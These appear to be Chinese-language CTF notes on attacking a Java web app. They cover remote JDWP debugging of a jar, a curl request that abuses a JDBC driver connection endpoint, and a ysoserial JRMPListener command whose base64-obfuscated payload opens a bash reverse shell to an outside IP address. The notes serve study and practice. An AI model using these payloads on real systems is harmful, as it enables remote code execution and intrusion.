- 有 pom.xml 文件，复制内容到 idea. maven 更新，会有些 vuln 提示
- [jdbcDriver](#jdbcdriver) : rogue_mysql_server 

# Java jar 文件调试

```sh
java -jar -Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=5005 <jarfile>
```

解压出 jar 文件。classes 下的内容放到 src 下面。在 idea 中看 比如 `com\ctf\badjava\BadjavaApplication.class` 放到 `src\com\ctf\badjava\BadjavaApplication.class`

- idea 中打开会显示源码，保存一份复制为 BadjavaApplication.java
- 去掉前几行的注释

`Edit Configuration - remote`, 默认参数即可。

- 下断点可正常调试了


# jdbcDriver
```sh
curl 192.168.142.1:8080/app3/testConnection/ -d 'Driver=com.tinysoft.jdbc.bridge.client.ClientDriver&url=jdbc:tsserver://127.0.0.1:3306/test'
# jdbc:tsserver 地址是是从服务器端发起的请求地址.
```

# ysoserial

```sh
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 "bash -c {echo,YmFzaCAtaSA+JAAvZGVDL3RjcC8xMjEuNDAuMjUzLjE3Ny8zODg4OCAwPiYx}|{base64,-d}|{bash,-i}"
```
# Article

[javasec](https://www.javasec.org/javaweb/JSON/FEATURE.html)

